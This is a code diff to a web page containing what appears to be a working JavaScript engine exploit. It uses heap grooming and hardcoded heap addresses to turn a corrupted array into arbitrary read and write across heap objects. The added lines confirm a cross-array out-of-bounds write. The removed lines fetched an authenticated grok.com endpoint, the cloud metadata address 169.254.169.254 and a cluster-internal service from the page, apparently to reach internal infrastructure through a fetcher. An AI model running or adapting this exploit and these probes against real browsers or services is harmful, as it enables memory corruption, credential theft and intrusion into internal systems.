@@ -13,9 +13,13 @@ function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
 const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1100011,MAXS=0x7fdffffe;
+
+// Three LO-space arrays: dblA (master elements), pinnedObj (heap layout), dblB (cross-array target)
 const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
 const pinnedObj=new Array(0x8000);for(let i=0;i<pinnedObj.length;i++)pinnedObj[i]=null;
+const dblB=new Array(0x4000);for(let i=0;i<dblB.length;i++)dblB[i]=50.5+i*0.002;
 const victim=[1.22,1.33,1.44];
+
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 const re=/(?:)/;
@@ -38,29 +42,44 @@ log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
   log("m0: "+f2i(m[0]).toString(16));
+
+  // Find dblB[0]=50.5 — expected at master index ~0x20000
+  // dblB FDA at 0x1200011, dblA FDA at 0x1100011
+  // master[k] reads 0x1100018 + k*8
+  // dblB[0] at 0x1200018 → k = (0x1200018-0x1100018)/8 = 0x20000
+  let bOK=false;
+  try{
+    const v=m[0x20000];
+    log("@20000: "+v);
+    if(Math.abs(v-50.5)<0.01) bOK=true;
+  }catch(e){log("@20000_E: "+e.message);}
+
+  if(!bOK){
+    // Try nearby
+    for(let k=0x1FFF0;k<=0x20010&&!bOK;k++){
+      try{
+        if(Math.abs(m[k]-50.5)<0.01){log("dblB@"+k.toString(16));bOK=true;}
+      }catch(e){break;}
+    }
+  }
+
+  if(bOK){
+    log("CROSS_ARRAY_OK");
+    // Write to dblB through master and verify
+    m[0x20000]=i2f(0xCAFEBABEDEADn);
+    log("dblB[0]_now: "+dblB[0]);
+    // If dblB[0] changed from 50.5, we have confirmed cross-array write
+    if(dblB[0]!==50.5){
+      log("CROSS_WRITE_OK");
+    }
+    dblB[0]=50.5;  // restore
+  }else{
+    log("dblB_MISS");
+  }
+
   log("W: "+wasmI.exports.f());
   log("CAGE_RW_OK");
-
-  // Probe internal Grok services and APIs from the fetcher
-  const probes=[
-    ["GROK","https://grok.com/rest/auth/get-user"],
-    ["META","http://169.254.169.254/computeMetadata/v1/"],
-    ["HADES","http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3/ping"],
-  ];
-
-  Promise.allSettled(probes.map(([name,url])=>{
-    const ac=new AbortController();setTimeout(()=>ac.abort(),2500);
-    return fetch(url,{signal:ac.signal,mode:"no-cors"}).then(r=>{
-      log(name+":"+r.status);
-      return r.text().then(t=>log(name+"_B:"+t.substring(0,100)));
-    }).catch(e=>log(name+"_E:"+e.message.substring(0,40)));
-  })).then(()=>log("=== DONE ==="));
-}else{
-  log("NO_ARR");
-  log("=== DONE ===");
-}
-}catch(e){
-  log("E: "+e.message);
-  log("=== DONE ===");
-}
+}else{log("NO_ARR");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
 </script></body></html>
